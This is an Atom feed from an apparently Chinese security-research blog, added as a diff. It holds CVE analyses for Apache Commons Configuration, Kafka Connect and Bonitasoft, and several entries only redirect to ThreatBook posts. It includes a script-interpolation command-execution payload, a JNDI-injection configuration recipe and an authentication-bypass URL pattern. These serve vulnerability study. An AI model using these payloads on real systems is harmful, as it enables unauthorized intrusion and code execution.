@@ -1,0 +1,737 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://le1a.github.io</id>
+    <title>Le1a的菜园坝</title>
+    <updated>2023-09-26T04:17:56.362Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://le1a.github.io"/>
+    <link rel="self" href="https://le1a.github.io/atom.xml"/>
+    <subtitle>欢迎来到菜园坝~~~</subtitle>
+    <logo>https://le1a.github.io/images/avatar.png</logo>
+    <icon>https://le1a.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Le1a的菜园坝</rights>
+    <entry>
+        <title type="html"><![CDATA[最新版Jeecg Boot V3.5.3 SQL注入漏洞分析(CVE-2023-42268)]]></title>
+        <id>https://le1a.github.io/post/CVE-2023-42268/</id>
+        <link href="https://le1a.github.io/post/CVE-2023-42268/">
+        </link>
+        <updated>2023-09-15T08:06:53.000Z</updated>
+        <content type="html"><![CDATA[ <style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleSafetyInfo/detail?circleId=3db0932beb4715435a1b324be29f87fe&securityId=12317"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[最新版Jeecg-Boot H2 JDBC 远程代码执行漏洞分析]]></title>
+        <id>https://le1a.github.io/post/jeecg-boot-jdbc/</id>
+        <link href="https://le1a.github.io/post/jeecg-boot-jdbc/">
+        </link>
+        <updated>2023-09-15T08:04:01.000Z</updated>
+        <content type="html"><![CDATA[ <style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleSafetyInfo/detail?circleId=3db0932beb4715435a1b324be29f87fe&securityId=12271"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Superset 反序列化漏洞分析(CVE-2023-37941)]]></title>
+        <id>https://le1a.github.io/post/CVE-2023-37941/</id>
+        <link href="https://le1a.github.io/post/CVE-2023-37941/">
+        </link>
+        <updated>2023-09-12T06:52:25.000Z</updated>
+        <content type="html"><![CDATA[ <style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleSafetyInfo/detail?circleId=3db0932beb4715435a1b324be29f87fe&securityId=12241"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WSO2 API Manager 任意文件上传漏洞分析(CVE-2022-29464)]]></title>
+        <id>https://le1a.github.io/post/CVE-2022-29464/</id>
+        <link href="https://le1a.github.io/post/CVE-2022-29464/">
+        </link>
+        <updated>2023-08-29T11:30:13.000Z</updated>
+        <content type="html"><![CDATA[ <style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleSafetyInfo/detail?circleId=3db0932beb4715435a1b324be29f87fe&securityId=11892"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Jackrabbit RMI反序列化漏洞分析(CVE-2023-37895)]]></title>
+        <id>https://le1a.github.io/post/CVE-2023-37895/</id>
+        <link href="https://le1a.github.io/post/CVE-2023-37895/">
+        </link>
+        <updated>2023-07-31T03:50:06.000Z</updated>
+        <content type="html"><![CDATA[ <style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleVulAnalysis/detail?circleId=3db0932beb4715435a1b324be29f87fe&vulId=5299"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[基于Thymeleaf沙箱逃逸的Spring Boot Admin远程代码执行漏洞(CVE-2023-38286)]]></title>
+        <id>https://le1a.github.io/post/CVE-2023-38286/</id>
+        <link href="https://le1a.github.io/post/CVE-2023-38286/">
+        </link>
+        <updated>2023-07-25T07:41:21.000Z</updated>
+        <content type="html"><![CDATA[<style>
+@keyframes countdown {
+  0% {color: #ffc0cb;}
+  50% {color: #ffb6c1;}
+  100% {color: #ffc0cb;} 
+}
+
+@keyframes colorful {
+  0% {color: #1E8449;}
+  50% {color: #43C6AC;}
+  100% {color: #1E8449;}
+}
+
+#tip {
+  font-size: 32px;
+  font-family: cursive; 
+  text-align: center;
+  animation: colorful 6s infinite;
+}
+
+#timer {
+  font-family: fantasy;
+  font-size: 48px;
+  text-align: center;  
+  animation: countdown 6s infinite;
+}
+</style>
+<div id="tip">文章首发微步X社区《漏洞挖掘与分析》圈子</div>
+<div id="timer">跳转倒计时:<span id="countDown">3</span>秒</div>
+<script>
+let count = 3;
+let timer = setInterval(() => {
+  if (count > 0) {
+    document.getElementById("countDown").innerHTML = count;
+    count--;
+  } else {
+    clearInterval(timer);
+    window.location.href = "https://x.threatbook.com/v5/circleSafetyInfo/detail?circleId=3db0932beb4715435a1b324be29f87fe&securityId=10918"; 
+  }
+}, 1000);
+</script>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Commons Configuration RCE(CVE-2022-33980)分析]]></title>
+        <id>https://le1a.github.io/post/CVE-2022-33980/</id>
+        <link href="https://le1a.github.io/post/CVE-2022-33980/">
+        </link>
+        <updated>2023-07-20T11:54:24.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1>
+<pre><code class="language-java">public static void main( String[] args ) {
+        InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder()
+          .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
+          .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
+          .create();
+        // 创建 ConfigurationInterpolator 实例
+        ConfigurationInterpolator configurationInterpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification);
+        // 解析包含占位符的字符串
+        System.out.printf(&quot;script: %s&quot;,configurationInterpolator.interpolate(&quot;${script:javascript:java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;)}&quot;));
+    }
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717153510710.png" alt="image-20230717153510710" loading="lazy"></figure>
+<p>通过<code>ConfigurationInterpolator.interpolate()</code>方法解析出表达式的值</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717154543221.png" alt="image-20230717154543221" loading="lazy"></figure>
+<p>首先会调用 <code>looksLikeSingleVariable</code> 判断是否符合表达式的格式:以<code>${</code>开头，<code>}</code>结尾</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717155101816.png" alt="image-20230717155101816" loading="lazy"></figure>
+<p>之后使用<code>resolveSingleVariable</code>对表达式进行处理</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717155424864.png" alt="image-20230717155424864" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717155433051.png" alt="image-20230717155433051" loading="lazy"></figure>
+<p>调用extractVariableName去掉${}。接着调用 <code>resolve</code> 对表达式进行处理，使用<code>:</code>来分割</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717155722675.png" alt="image-20230717155722675" loading="lazy"></figure>
+<p>然后先通过fetchLookupForPrefix取出script的lookup对象</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717160434860.png" alt="image-20230717160434860" loading="lazy"></figure>
+<p>然后执行lookup</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717160507978.png" alt="image-20230717160507978" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717160737230.png" alt="image-20230717160737230" loading="lazy"></figure>
+<p>根据选择的引擎执行 <code>eval()</code> 方法的脚本引擎提供了在 Java 程序中执行不同脚本语言（例如 JavaScript、Groovy、Python 等）的能力，甚至包括执行 Java 代码本身的能力。虽然 <code>javax.script</code> 包通常用于执行脚本语言，但它并不限制执行的内容只能是脚本语言代码。实际上，Script Engine 是可以执行任意可执行的代码，包括 Java 代码。</p>
+<p>除了Script引擎，其他一些引擎（例如 URL 和 DNS 引擎）也具有潜在的危险性。这些引擎可能涉及到网络连接和执行远程请求，因此在使用它们时需要格外小心，以防止可能的安全漏洞。</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<h2 id="scriptengine">ScriptEngine</h2>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717161400488.png" alt="image-20230717161400488" loading="lazy"></figure>
+<h2 id="dnsengine">DNSEngine</h2>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717160946603.png" alt="image-20230717160946603" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717160954381.png" alt="image-20230717160954381" loading="lazy"></figure>
+<h2 id="urlengine">URLEngine</h2>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717161215931.png" alt="image-20230717161215931" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/image-20230717161240539.png" alt="image-20230717161240539" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Kafka Connect JNDI 注入漏洞(CVE-2023-25194)分析]]></title>
+        <id>https://le1a.github.io/post/CVE-2023-25194/</id>
+        <link href="https://le1a.github.io/post/CVE-2023-25194/">
+        </link>
+        <updated>2023-07-15T11:43:59.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>Apache Kafka 是一种分布式流处理平台。它可以在分布式系统中可靠地发布和订阅流数据。 Kafka 用作实时数据流的中央数据管道,能有效地连接各种系统和应用。在Apache Kafka Connect中存在JNDI注入漏洞，当攻击者可访问Kafka Connect Worker，且可以创建或修改连接器时，通过设置sasl.jaas.config属性为com.sun.security.auth.module.JndiLoginModule，进而可导致JNDI注入</p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/9ef6602eab0bb.png" alt="1686127828050.png" loading="lazy"></figure>
+<p>调用<code>KafkaProducer#KafkaProducer()</code>构造函数</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/36e8b15965688.png" alt="1686127929595.png" loading="lazy"></figure>
+<p>然后调用他的重载方法</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/d3520e998c439.png" alt="1686128264173.png" loading="lazy"></figure>
+<p>再调用重载方法</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/186daf10cb79d.png" alt="1686128482304.png" loading="lazy"></figure>
+<p>一共经历四次调用重载方法后，进入<code>newSender()</code></p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/d573e55d058d2.png" alt="1686137249398.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/ed923156180b4.png" alt="1686130699510.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/8919692699861.png" alt="1686130891741.png" loading="lazy"></figure>
+<p>跟进到<code>ClientUtils#createChannelBuilder()</code>，这里的<code>security.protocol</code>和<code>sasl.mechanism</code>是我们传进去的，如果不手动指定，则会抛出null异常。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/ed90743cfb5f6.png" alt="1686132081641.png" loading="lazy"></figure>
+<p>跟进到<code>ChannelBuiders#cilentChannelBuilder()</code>，这里需要<code>contextType</code>和<code>clientSaslMechanism</code>不为空</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/4f78d3d3d7e89.png" alt="1686132351462.png" loading="lazy"></figure>
+<p>调用<code>ChannelBuilders#create()</code></p>
+<pre><code class="language-java">private static ChannelBuilder create(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, boolean isInterBrokerListener, String clientSaslMechanism, boolean saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier) {
+        Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);
+        Object channelBuilder;
+        switch (securityProtocol) {
+            case SSL:
+                requireNonNullMode(mode, securityProtocol);
+                channelBuilder = new SslChannelBuilder(mode, listenerName, isInterBrokerListener, logContext);
+                break;
+            case SASL_SSL:
+            case SASL_PLAINTEXT:
+                requireNonNullMode(mode, securityProtocol);
+                String sslClientAuthOverride = null;
+                Object jaasContexts;
+                if (mode != Mode.SERVER) {
+                    JaasContext jaasContext = contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);
+                    jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);
+                } else {
+                    List&lt;String&gt; enabledMechanisms = (List)configs.get(&quot;sasl.enabled.mechanisms&quot;);
+                    jaasContexts = new HashMap(enabledMechanisms.size());
+                    Iterator var18 = enabledMechanisms.iterator();
+
+                    String listenerClientAuth;
+                    while(var18.hasNext()) {
+                        listenerClientAuth = (String)var18.next();
+                        ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));
+                    }
+
+                    if (listenerName != null &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) {
+                        String configuredClientAuth = (String)configs.get(&quot;ssl.client.auth&quot;);
+                        listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), true).get(&quot;ssl.client.auth&quot;);
+                        if (listenerClientAuth == null) {
+                            sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);
+                            if (configuredClientAuth != null &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) {
+                                log.warn(&quot;Broker configuration '{}' is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;, &quot;ssl.client.auth&quot;);
+                            }
+                        }
+                    }
+                }
+
+                channelBuilder = new SaslChannelBuilder(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);
+                break;
+            case PLAINTEXT:
+                channelBuilder = new PlaintextChannelBuilder(listenerName);
+                break;
+            default:
+                throw new IllegalArgumentException(&quot;Unexpected securityProtocol &quot; + securityProtocol);
+        }
+
+        ((ChannelBuilder)channelBuilder).configure(configs);
+        return (ChannelBuilder)channelBuilder;
+    }
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/3d12cf1b8204b.png" alt="1686133882006.png" loading="lazy"></figure>
+<p>当<code>security.protocol</code>值为<code>SSL</code>时，<code>channelBuilder</code>为<code>SslChannelBuilder</code>类</p>
+<p>当<code>security.protocol</code>值为<code>SASL、SASL_PLAINTEXT</code>时，<code>channelBuilder</code>为<code>SaslChannelBuilder</code>类</p>
+<p>当<code>security.protocol</code>值为<code>PLAINTEXT</code>时，<code>channelBuilder</code>为<code>PlaintextChannelBuilder</code>类</p>
+<p>若都不是，则抛出<code>IllegalArgumentException</code>错误</p>
+<blockquote>
+<p>这里基于config信息生成了JaasContext实例，然后SaslChannelBuilder对象</p>
+</blockquote>
+<p>在实例化JaasContext的时候，会<code>new JaasConfig(globalContextName, dynamicJaasConfig.value());</code>把<code>sasl.jaas.config</code>中的字符串解析成<code>AppConfigurationEntry</code>对象，其中包含<code>loginModuleName</code>以及其他参数</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/1ebd530b616cf.png" alt="1686202401949.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/637b458a46273.png" alt="1686199852392.png" loading="lazy"></figure>
+<p>跟进到<code>SaslChannelBuilder#configure()</code></p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/4d76eda893f53.png" alt="1686134608855.png" loading="lazy"></figure>
+<p>继续跟进到<code>LoginManager#acquireLoginManger</code></p>
+<pre><code class="language-java">public static LoginManager acquireLoginManager(JaasContext jaasContext, String saslMechanism, Class&lt;? extends Login&gt; defaultLoginClass, Map&lt;String, ?&gt; configs) throws LoginException {
+        Class&lt;? extends Login&gt; loginClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, &quot;sasl.login.class&quot;, defaultLoginClass);
+        Class&lt;? extends AuthenticateCallbackHandler&gt; defaultLoginCallbackHandlerClass = &quot;OAUTHBEARER&quot;.equals(saslMechanism) ? OAuthBearerUnsecuredLoginCallbackHandler.class : AbstractLogin.DefaultLoginCallbackHandler.class;
+        Class&lt;? extends AuthenticateCallbackHandler&gt; loginCallbackClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, &quot;sasl.login.callback.handler.class&quot;, defaultLoginCallbackHandlerClass);
+        Class var7 = LoginManager.class;
+        synchronized(LoginManager.class) {
+            Password jaasConfigValue = jaasContext.dynamicJaasConfig();
+            LoginManager loginManager;
+            LoginMetadata loginMetadata;
+            if (jaasConfigValue != null) {
+                loginMetadata = new LoginMetadata(jaasConfigValue, loginClass, loginCallbackClass);
+                loginManager = (LoginManager)DYNAMIC_INSTANCES.get(loginMetadata);
+                if (loginManager == null) {
+                    loginManager = new LoginManager(jaasContext, saslMechanism, configs, loginMetadata);
+                    DYNAMIC_INSTANCES.put(loginMetadata, loginManager);
+                }
+            } else {
+                loginMetadata = new LoginMetadata(jaasContext.name(), loginClass, loginCallbackClass);
+                loginManager = (LoginManager)STATIC_INSTANCES.get(loginMetadata);
+                if (loginManager == null) {
+                    loginManager = new LoginManager(jaasContext, saslMechanism, configs, loginMetadata);
+                    STATIC_INSTANCES.put(loginMetadata, loginManager);
+                }
+            }
+
+            SecurityUtils.addConfiguredSecurityProviders(configs);
+            return loginManager.acquire();
+        }
+    }
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/a0888ca73eaa4.png" alt="1686135717346.png" loading="lazy"></figure>
+<p>跟进LoginManager的构造函数</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/fd52fe8570e3d.png" alt="1686135829245.png" loading="lazy"></figure>
+<p>调用<code>KerberosLogin#login()</code>，调用父类的login</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/0924f9265dfe1.png" alt="1686136198763.png" loading="lazy"></figure>
+<p><code>AbstractLogin#login()</code>，下面会new一个<code>LoginContext</code>类，调用login</p>
+<pre><code class="language-java">public LoginContext login() throws LoginException {
+        this.loginContext = new LoginContext(this.contextName, (Subject)null, this.loginCallbackHandler, this.configuration);
+        this.loginContext.login();
+        log.info(&quot;Successfully logged in.&quot;);
+        return this.loginContext;
+    }
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/17a4448b229c9.png" alt="1686136840138.png" loading="lazy"></figure>
+<p>经过一系列调用，最后走到<code>LoginContext#incoke()</code>反射获取到<code>com.sun.security.auth.module.JndiLoginModule</code>类，然后后面实例化了。</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/c410a336f356e.png" alt="1686203738226.png" loading="lazy"></figure>
+<p>然后进入<code>JndiLoginModule#login()</code>，其中userProvider和groupProvider都不能为null。</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/3c8b120aba5fa.png" alt="1686204110066.png" loading="lazy"></figure>
+<p>当useFirstPass=true或tryFirstPass=true时，进入到<code>attemptAuthentication();</code></p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/97b707589d5f8.png" alt="1686204234701.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/b18c7b426c2c8.png" alt="1686204253349.png" loading="lazy"></figure>
+<p>这里调用<code>InitialContext#lookup</code>，触发<code>JNDI注入</code></p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/08/bce7ccbcd6a35.png" alt="1686204302396.png" loading="lazy"></figure>
+<p>总结：当攻击者可以控制<code>kafka-clients</code>连接时的属性：</p>
+<ul>
+<li><code>security.protocol</code>设置为<code>SASL_PLAINTEXT </code>或<code>SASL_SSL</code>，并且指定<code>sasl.mechanism</code></li>
+<li><code>sasl.jaas.config</code>设置为<code>com.sun.security.auth.module.JndiLoginModule</code>，且<code>userProvider</code>以及<code>groupProvider</code>都不为<code>null</code>，并且设置了useFirstPass=true或tryFirstPass=true</li>
+</ul>
+<p>此时<code>kafka client</code>发起连接，就会发起JNDI连接，导致<code>JDNI注入</code></p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/07/88fcda9d90066.png" alt="1686138837562.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Bonitasoft Platform 越权RCE(CVE-2022-25237)分析]]></title>
+        <id>https://le1a.github.io/post/CVE-2022-25237/</id>
+        <link href="https://le1a.github.io/post/CVE-2022-25237/">
+        </link>
+        <updated>2023-07-04T12:53:04.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1>
+<h2 id="权限绕过">权限绕过</h2>
+<p>该漏洞的原理是由于权限绕过，导致攻击者可以未授权通过api端口上传恶意文件，从而命令执行。</p>
+<p>在<code>bonita\BonitaCommunity-2021.2-u0\server\webapps\bonita\WEB-INF\web.xml</code>配置文件中，自定义了filter，并且对参数excludePatterns进行了赋值。</p>
+<p>有两个Filter类<code>RestAPIAuthorizationFilter</code>、<code>TokenValidatorFilter</code>中的参数excludePattern都被指定为<code>i18ntranslation</code></p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/7c5dc174a4992.png" alt="1688459249739.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/10a726b80fabf.png" alt="1688461930078.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/ad2328258f5dc.png" alt="1688461991598.png" loading="lazy"></figure>
+<p>这两个类都继承了<code>AbstractAuthorizationFilter</code>类，来看一下对应的dofilter方法</p>
+<pre><code class="language-java">public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        MultiReadHttpServletRequest httpRequest = new MultiReadHttpServletRequest((HttpServletRequest)request);
+        HttpServletResponse httpResponse = (HttpServletResponse)response;
+        String requestURL = httpRequest.getRequestURI();
+        if (this.sessionIsNotNeeded(requestURL, this.excludePatterns)) {
+            chain.doFilter(httpRequest, httpResponse);
+        } else if (this.checkValidCondition(httpRequest, httpResponse)) {
+            chain.doFilter(httpRequest, httpResponse);
+        }
+
+    }
+</code></pre>
+<p>这里如果通过了<code>sessionIsNotNeeded()</code>方法的检查，则将继续应用程序流程。</p>
+<pre><code class="language-java">protected boolean sessionIsNotNeeded(String requestURL, String excludePatterns) {
+        boolean isMatched = false;
+        if (excludePatterns != null) {
+            String[] patterns = excludePatterns.split(&quot;,&quot;);
+            int i = 0;
+
+            for(int size = patterns.length; i &lt; size; ++i) {
+                if (requestURL.contains(patterns[i])) {
+                    isMatched = true;
+                    break;
+                }
+            }
+        }
+
+        return isMatched;
+    }
+</code></pre>
+<p>如果传入的url中，包含excludePatterns的值，则返回true。而在web.xml中对RestAPIAuthorizationFilter和TokenValidatorFilter过滤器的excludePatterns参数赋值为i18ntranslation。</p>
+<p>则URl包含<code>/i18ntranslation/../</code>或<code>;i18ntranslation</code>就可以绕过权限认证。</p>
+<p>因为 <code>/API/*</code> 路由对应了 <code>RestAPIAuthorizationFilter</code> ，因此可以选择 <code>/API/*;i18ntranslation</code> 来绕过。</p>
+<p>如下所示，sessionIsNotNeeded函数返回true</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/213c510e283ea.png" alt="1688469961293.png" loading="lazy"></figure>
+<h2 id="rce">RCE</h2>
